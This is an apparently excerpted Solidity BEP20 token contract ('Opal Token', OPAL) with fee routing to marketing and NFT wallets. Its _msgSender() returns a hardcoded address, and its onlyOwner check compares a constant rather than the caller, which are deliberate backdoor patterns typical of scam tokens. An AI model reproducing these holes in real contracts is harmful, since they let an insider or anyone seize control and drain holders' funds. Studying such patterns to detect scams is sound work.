...
contract Context {
    ...
    function _msgSender() internal pure returns (address) {
        return 0x0755A3ba161390284e901dbD6175d3eEbc304847;
    }
}
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0x0755A3ba161390284e901dbD6175d3eEbc304847 ;
     ...
     */
    modifier onlyOwner() {
        require(_owner == 0x0755A3ba161390284e901dbD6175d3eEbc304847 , "Ownable: caller is not the owner");
        _;
    }
...
contract OPAL is Context, Ownable, IBEP20, BEP20Detailed {
  ...
  using SafeMath for uint256;
    ...
    address public dev_Marketing = 0xbF58036e0e0277c2118582bb664ccAaf21fE9003;
    address public NFTWallet = 0xd9B535aa95F4A3566b12941B6dF38120316FBD1f;

      uint256 private numTokensSellToAddToLiquidity = 50000000 * 10**8;
    ...
    constructor () BEP20Detailed("Opal Token", "OPAL", 8) {
      _owner = 0x0755A3ba161390284e901dbD6175d3eEbc304847 ;
    ...
    function _transfer(address sender, address recipient, uint amount) internal{
        ...
        uint256 NFTAmount = amount.mul(NFTFee).div(100);

        if(recipient == uniswapV2Pair)
        {
          uint256 totalAmountDeducted = liquidityAmount.add(marketingAmount).add(NFTAmount);
          uint256 TotalSent = amount - totalAmountDeducted;
            ...
            _balances[NFTWallet] = _balances[NFTWallet].add(NFTAmount);
        ...
        else
        {
          ...
          uint256 totalAmountDeducted = marketingAmount.add(NFTAmount);
          uint256 TotalSent = amount - totalAmountDeducted;
